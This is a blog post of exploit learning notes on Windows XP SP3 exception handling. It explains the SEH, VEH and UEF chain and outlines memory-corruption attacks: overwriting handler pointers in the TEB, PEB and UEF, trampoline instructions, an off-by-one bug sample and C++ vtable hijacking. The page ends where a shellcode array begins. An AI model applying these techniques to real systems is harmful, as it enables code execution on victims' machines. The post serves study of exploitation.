<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Deep dive into Windows exception handling, with some other exploits"><title>Exploit learning notes 009 Windows exceptions in depth</title><link rel=canonical href=https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="Exploit learning notes 009 Windows exceptions in depth"><meta property="og:description" content="Deep dive into Windows exception handling, with some other exploits"><meta property="og:url" content="https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/"><meta property="og:site_name" content="Misaka's Secrect Garden"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="ExceptionHandling"><meta property="article:published_time" content="2020-10-25T15:09:00+08:00"><meta property="article:modified_time" content="2020-10-25T15:09:00+08:00"><meta name=twitter:title content="Exploit learning notes 009 Windows exceptions in depth"><meta name=twitter:description content="Deep dive into Windows exception handling, with some other exploits"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>Misaka's Secrect Garden</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><li><a href=/comment/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>Comment</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/ selected>English</option><option value=https://blog.moeomu.com/zh-cn/>‰∏≠Êñá</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#different-levels-of-seh>Different levels of SEH</a><ol><li><a href=#exception-handling-for-threads>Exception handling for threads</a></li><li><a href=#process-exception-handling>Process exception handling</a></li><li><a href=#system-default-exception-handling-uef>System default exception handling UEF</a></li><li><a href=#summary-of-exception-flow>Summary of exception flow</a></li></ol></li><li><a href=#other-exception-handling-utilization-ideas>Other exception handling utilization ideas</a><ol><li><a href=#veh-utilization>VEH utilization</a></li><li><a href=#attack-the-seh-header-node-in-the-teb>Attack the SEH header node in the TEB</a></li><li><a href=#attacking-the-uef>Attacking the UEF</a></li><li><a href=#attack-the-function-pointer-in-peb>Attack the function pointer in PEB</a></li></ol></li><li><a href=#off-by-one-exploit><code>off by one</code> exploit</a><ol><li><a href=#exploits>Exploits</a></li></ol></li><li><a href=#attacking-c-virtual-functions>Attacking C++ virtual functions</a><ol><li><a href=#theory>Theory</a></li><li><a href=#try>Try</a></li><li><a href=#description>Description</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/exploit/>Exploit</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/exploit-learning-notes-009-windows-exceptions-in-depth/>Exploit learning notes 009 Windows exceptions in depth</a></h2><h3 class=article-subtitle>Deep dive into Windows exception handling, with some other exploits</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Oct 25, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>10 minute read</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-009-windows%E5%BC%82%E5%B8%B8%E7%9A%84%E6%B7%B1%E5%85%A5/ class=link>‰∏≠Êñá</a></div></footer></div></header><section class=article-content><p>Disclaimer: The experimental environment is Windows XP SP3</p><p>Source: <a class=link href=/posts/exploit-learning-notes-009-windows-exceptions-in-depth/>Moeomu&rsquo;s blog</a></p><h2 id=different-levels-of-seh>Different levels of SEH</h2><ul><li>The smallest scope of exception handling is threads, each thread has its own SEH chain and uses its own SEH first when an error occurs</li><li>There may be many threads in a process at the same time, and the process also consists of one that can handle global exception handling. When the thread&rsquo;s own SEH is unable to fix the error, the process&rsquo;s SEH will handle the exception. This exception handling may affect all threads under the process</li><li>The operating system provides a default exception handling function for all programs. When all exception handling functions are unable to handle the error, this default exception handling function will be called eventually and the result will generally be displayed when the error dialog is to be given</li><li>The following is a simple exception handling process<ul><li>First execute the SEH or exception handling function nearest to HANDING in the thread</li><li>If it fails, try to execute the subsequent exception handling functions in the SEH chain in turn</li><li>If all the exception handling functions in the SEH chain fail to handle the exception, the exception handling of the process will be executed</li><li>If it still fails, the system default exception handling function will be called and the program crash dialog will pop up</li></ul></li></ul><h3 id=exception-handling-for-threads>Exception handling for threads</h3><blockquote><p>Threads try to handle exceptions sequentially by referring to the SEH chain through the TEB</p></blockquote><ul><li>The callback function used for exception handling has 4 parameters<ul><li><code>pExecpt</code>: points to an important structure: <code>EXCEPTION_RECORD</code>, which contains several exception-related information, such as the type of the exception, the address where the exception occurred, etc.</li><li><code>pFrame</code>: points to the SEH structure in the stack frame</li><li><code>pContext</code>: points to the <code>Context</code> structure, which contains the state of all registers</li><li><code>pDispatch</code>: unknown</li></ul></li><li>Before the callback function is executed, the system stacks the information about the breakpoint when the above exception occurs. With these descriptions, the callback function can easily handle exceptions</li><li>After the callback function returns, the operating system will decide what to do next based on the results returned. Exception handling functions can return two kinds of results<ul><li><code>0(Exception Continue Excetutuon)</code>: means the exception was successfully handled and will return to the place where the exception occurred and continue to execute subsequent instructions</li><li><code>1(Exception Continue Search)</code>: the exception handling failed, it will search down the SEH chain for other functions that can be used for exception handling and try to handle them</li></ul></li><li><code>UNWIND</code> operation<ul><li>When an exception occurs, the OS will search the SEH chain for the handle to handle the exception, and once found, the system will call the SEH exception handling functions that have been traversed again.</li><li>The main purpose is to notify the previous SEHs that failed to handle the exception that the system has abandoned them and ask them to clean up the site to release resources, and then remove the SEH structure from the chain table.</li><li>When <code>ExceptionCode</code> in the <code>EXCEPTION_RECORD</code> structure pointed to by <code>pExcept</code> is set to <code>0xC0000027(STATUS_UNWIND)</code> and <code>ExceptionFlags</code> is set to <code>0x2(EH_UNWINDING)</code>, the callback function for the call is an <code>unwind</code> call</li><li>This operation is implemented through an export function <code>RtlUnwind</code> in <code>kernel.32</code>.</li><li>Before using the callback function, the system will determine if it is currently in debug state, and if it is, it will pass the exception to the debugger</li></ul></li></ul><blockquote><p><code>EXCEPTION_RECORD</code></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=nc>_EXCEPTION_RECORD</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>   <span class=n>ExceptionCode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>   <span class=n>ExceptionFlags</span><span class=p>;</span> <span class=c1>//ÂºÇÂ∏∏Ê†áÂøó‰Ωç
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=nc>_EXCEPTION_RECORD</span> <span class=o>*</span><span class=n>ExceptionRecord</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>   <span class=n>ExceptionAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>   <span class=n>NumberParameters</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>   <span class=n>ExceptionInformation</span> <span class=p>[</span><span class=n>EXCEPTION_MAXIMUM_PARAMETERS</span><span class=p>];</span>
</span></span><span class=line><span class=cl> <span class=p>}</span> <span class=n>EXCEPTION_RECORD</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p><code>RtlUnwind</code></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=kt>void</span> <span class=nf>RtlUnwind</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>               <span class=n>TargetFrame</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>               <span class=n>TargetIp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PEXCEPTION_RECORD</span>   <span class=n>ExceptionRecord</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>               <span class=n>ReturnValue</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=process-exception-handling>Process exception handling</h3><blockquote><p>All exceptions that occur in threads that are not handled by the thread or the latter debugger of the exception handling function will eventually be handed over to the process exception handling function</p></blockquote><ul><li>The callback function for process exception handling needs to be registered through the API function <code>SetUnhandleExceptionFilter</code>.</li><li>There are 3 types of return values for this function<ul><li><code>1(EXCEPTION_EXECUTE_HANDLER)</code>: means that the error is handled correctly and the program will exit.</li><li><code>0(EXCEPTION_CONTINUE_SEARCH)</code>: the error cannot be handled, and the error will be forwarded to the system default exception handling.</li><li><code>-1(EXCEPTION_CONTINUE_EXECUTION)</code>: indicates that the error was handled correctly and execution will continue. Similar to the threaded exception handling, the system will recover the breakpoint condition at the time of the exception with the parameters of the callback function, but by this time the register value that caused the exception should have been fixed.</li></ul></li></ul><blockquote><p><code>SetUnhandleExceptionFilter</code></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=n>LPTOP_LEVEL_EXCEPTION_FILTER</span> <span class=nf>SetUnhandledExceptionFilter</span><span class=p>(</span>
</span></span><span class=line><span class=cl> <span class=n>LPTOP_LEVEL_EXCEPTION_FILTER</span> <span class=n>lpTopLevelExceptionFilter</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=system-default-exception-handling-uef>System default exception handling UEF</h3><blockquote><p>If the process exception handler fails or the program has no process exception handler, the system default exception handler <code>UnhandledExceptionFilter()</code> will be called, which is the ultimate exception handler <code>UEF(Unhandled Exception Filter)</code>.</p></blockquote><blockquote><p>MSDN refers to it as the &ldquo;top-level exception handler&rdquo;, i.e. the top-level exception handler, or the last exception handler used</p></blockquote><ul><li>In <code>Windows 2000- Windows XP</code>, this function will check the contents of the registry <code>HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug</code>, the <code>Auto</code> item identifies whether the dialog box pops up, <code>1</code> means no pop up, just end the program. All others will pop up</li><li>The <code>Debugger</code> item specifies the system default debugger</li></ul><h3 id=summary-of-exception-flow>Summary of exception flow</h3><ul><li>CPU executes catching exceptions, kernel takes over control and starts kernel state exception handling</li><li>Kernel exception handling is finished and control is handed over to user state</li><li>The first exception handling function in the user state is the <code>KiUserExceptionDispatcher()</code> function in <code>ntdll.dll</code>.</li><li>This function first checks if the program is in debug state, and if it is debugged, gives the exception to the debugger to handle</li><li>Try to add <code>VEH(Vectored Exception Handling)</code> to handle exceptions</li><li>In non-debugging state, call <code>RtlDispatchException()</code> function to iterate through the thread&rsquo;s SEH chain, if the callback function for handling exceptions can be found, it will again iterate through the previously called SEH handle, i.e., unwind operation, to ensure the integrity of the exception handling mechanism</li><li>If all the SEHs in the stack fail, the process has an exception handling function and will call this function</li><li>If the custom process exception handling fails, the system default UEF will be called</li></ul><h2 id=other-exception-handling-utilization-ideas>Other exception handling utilization ideas</h2><h3 id=veh-utilization>VEH utilization</h3><blockquote><p>Starting from <code>WindowsXP</code>, a new type of exception handling has been added: <code>VEH (Vectored Exception Handler)</code> vectorized exception handling</p></blockquote><ul><li>VEH and process exception handling is similar, are process-based, need to use the API to register callback functions</li><li>Multiple VEHs can be handled, and the structures are linked in a bidirectional chain.</li><li>Processing priority is second to debugger processing and higher than SEH processing</li><li>Registering a VEH can enforce its position in the chain</li><li>VEHs are stored in the heap</li><li>unwind operation does not involve VEH process class exception handling</li></ul><blockquote><p>VEH structures</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=k>struct</span> <span class=nc>_VECTORED_EXCEPTION_NODE</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>m_pNextNode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>m_pPreviousNode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>m_pfnVectoredHandler</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>VEH registration function</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=n>PVOID</span> <span class=nf>AddVectoredExceptionHandler</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>FirstHandler</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVECTORED_EXCEPTION_HANDLER</span> <span class=n>VectoredHandler</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>If the heap overflow DWORD SHOOT is used to modify the pointer to the VEH header node, it can lead the program to execute the shellcode after the exception handling starts</li></ul><h3 id=attack-the-seh-header-node-in-the-teb>Attack the SEH header node in the TEB</h3><blockquote><p>The SEH chain of the thread points to the closest SEH to the top of the stack through the first DWORD pointer in the TEB. If this pointer in the TEB is modified, it will direct the program to execute the shellcode only when the exception occurs</p></blockquote><ul><li>Limitations<ul><li>Multiple threads exist in a process</li><li>Each thread has a TEB</li><li>The first TEB starts at <code>0x7FFDE000</code></li><li>The TEB of the new thread will follow the previous TEB, separated by <code>0x1000</code> bytes, growing towards the lower address of memory</li><li>It is difficult for multi-threaded programs to determine which thread is the current thread and where the corresponding TEB is located, and the method of attacking the SEH header node in the TEB is generally used for single-threaded programs</li></ul></li></ul><blockquote><p>Although it is possible to create many threads or close a large number of threads to try to control the TEB arrangement, the multi-threaded state should not be obsessed with using the TEB</p></blockquote><h3 id=attacking-the-uef>Attacking the UEF</h3><blockquote><p>Heap overflow with DOWRD SHOOT target pointing to the entry of the UEF and data being the entry address of the shellcode, then create an exception that can only be handled by the UEF</p></blockquote><ul><li>Combined with the use of springboard technology can make the success rate of exploit higher</li><li>When an exception occurs, the EDI often points to a place in the heap that is not far from the shellcode</li><li>Overwriting the UEF handle with a <code>CALL DWORD PTR [EDI + 0x78]</code> instruction address will often allow the program to jump into the shellcode</li><li>or <code>CALL DWORD PTR [ESI + 0x4C]</code> or <code>CALL DWORD PTR [EBP + 0x74]</code> will work</li></ul><h3 id=attack-the-function-pointer-in-peb>Attack the function pointer in PEB</h3><ul><li>ExitProcess() then needs to enter the critical section to synchronize the threads when cleaning up the scene, and will eventually call RtlEnterCriticalSection() and RtlLeaceCriticalSection()</li><li>The address of the PEB is always the same, which is a better choice than the TEB</li></ul><h2 id=off-by-one-exploit><code>off by one</code> exploit</h2><blockquote><p>Hierarchy of exploit techniques.</p><ul><li>Basic stack overflow exploit: hijacking the process with the return address</li><li>Advanced stack overflow exploits: exploits that can only partially flood the EBP but cannot reach the return address, such as the <code>off by one</code> exploit that occurs when the strncpy function is misused</li><li>Heap overflow and format string exploits</li></ul></blockquote><h3 id=exploits>Exploits</h3><blockquote><p>Code snippet</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=kt>void</span> <span class=nf>off_by_one</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span> <span class=n>input</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>len</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>input</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&amp;&amp;</span><span class=p>(</span><span class=n>i</span> <span class=o>&lt;=</span> <span class=n>len</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>input</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>This function tries to prevent array overruns during string copying, but the loop <code>i &lt;= len</code> goes wrong in the boundary control and may overflow by one byte</li><li>We can control EBP in the range of 255 bytes and possibly some important parameters of the program</li></ul><h2 id=attacking-c-virtual-functions>Attacking C++ virtual functions</h2><h3 id=theory>Theory</h3><ul><li>A member function of a C++ class is a virtual function if it is modified with the virtual keyword when it is declared</li><li>A class may consist of many virtual functions</li><li>The entry address of the virtual function is stored in the virtual table (Vtable).</li><li>When an object uses a virtual function, it first finds the virtual table by using the virtual table pointer, and then takes the final function entry address from the virtual table to call it</li><li>The pointer to the virtual table is stored in the object&rsquo;s memory space, followed by other member variables</li><li>Dummy functions can only be called dynamically by reference to an object pointer</li></ul><h3 id=try>Try</h3><ul><li>When a member variable in an object overflows, there is an opportunity to modify the virtual table pointer in the object or modify the virtual function pointer in the virtual table</li><li>This makes it possible to execute shellcode</li></ul><blockquote><p>code attempts</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CPP data-lang=CPP><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Test on Windows XP SP3 without any other patch.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;windows.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;iostream.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span><span class=o>=</span>
